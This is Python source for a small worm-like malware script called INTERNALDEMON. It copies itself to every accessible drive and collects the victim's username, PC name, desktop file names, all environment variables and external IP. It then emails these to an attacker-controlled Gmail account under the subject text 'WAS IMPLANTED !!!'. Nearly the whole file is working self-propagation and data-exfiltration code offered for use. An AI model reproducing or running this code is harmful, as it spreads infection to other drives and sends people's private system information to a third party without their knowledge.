'''

NAME:    INTERNALDEMON
AUTHOR:  S1DAL3X
VERSION: 3.1
PYTHON:  3.6.1

Please enter your gmail login and password before using script
(login, password, login again)

'''

import os
import string
import shutil
import socket
import smtplib
from bs4 import BeautifulSoup                                               # BS and urllib to get IP on interne.yandex.ru
from urllib.request import urlopen     


LOGIN = os.getlogin()
FILES = []
INFO = str(os.environ)


# Checking available disks for infection (disk C does not give rights)
def check_disk():
    for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
        path = letter + '://'       
        try:
            if os.path.isdir(path):
                shutil.copy('INTERNALDEMON.py', path)
            else:
                pass
        except PermissionError:
            pass
    get_desktop()

    
# Get list of files on desktop (We get names only with latin letters)
def get_desktop():
    if os.getcwd() != "C://Users//" + str(LOGIN) + '//Desktop':
        os.chdir("C://Users//" + str(LOGIN) + '//Desktop')
        FILES = os.listdir()
    else:
        pass
        
    FILES_str = ''.join(FILES)                                                  # Make from list one string
    FILES_str2 = ''.join(c for c in FILES_str if c in string.ascii_letters)     # Leave in string only latin letters
    get_outside_ip(FILES_str2, INFO)      
    
        
# Get the external IP address of the PC 
def get_outside_ip(arg, arg2):
    url = urlopen('https://yandex.ru/internet/')                                # internet.yandex give us IP 
    soup = BeautifulSoup(url, 'html.parser')
    out_str = soup.find('div', class_='client__desc')
    out_str = str(out_str)                                                      
    ip = []
    
    for symbol in out_str:
        if '1234567890.'.find(symbol) != -1:
            ip.append(symbol)
            
    outside_ip = ''.join(ip)                                                    # Our IP
    
    report(outside_ip, arg, arg2)
    
 
# Send on g-mail information about PC
def report(ip_adress, arg, arg2):
    array = ['\n OS_NAME    => ' + str(os.environ['OS']),                          
             '\n LOGIN      => ' + str(os.environ['USERNAME']),                      
             '\n PC_NAME    => ' + str(os.environ['USERDOMAIN']),                  
             '\n DESK_FILES => ' + arg,                                         
             '\n SYS_INFO   => ' + arg2]
    pc_name = socket.gethostname()
    report_text = str(ip_adress) + ' WAS IMPLANTED !!! \n\n' + '\n'.join(array)
    msgObject = smtplib.SMTP('smtp.gmail.com', 587)

    msgObject.starttls()
    msgObject.login('-----', '-----')                                           # Here enter your login and password                                           
    msgObject.sendmail('123@gmail.com', '-----', str(report_text))              # Enter login again
    msgObject.quit()                                                            # Close smtplib session
    
    
if __name__ == '__main__':                                                      # Let's go !
    check_disk()

